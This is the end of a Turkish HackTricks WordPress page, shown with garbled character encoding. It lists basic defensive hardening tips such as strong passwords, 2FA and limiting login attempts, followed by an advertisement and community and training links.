* VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
* **GÃ¼Ã§lÃ¼ ÅŸifreler** ve **2FA** kullanÄ±n
* KullanÄ±cÄ± **izinlerini** periyodik olarak **gÃ¶zden geÃ§irin**
* Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in **giriÅŸ denemelerini** sÄ±nÄ±rlayÄ±n
* **`wp-admin.php`** dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve yalnÄ±zca dahili eriÅŸime veya belirli IP adreslerinden eriÅŸime izin verin.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* Hacking ipuÃ§larÄ±nÄ± [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
{% endhint %}
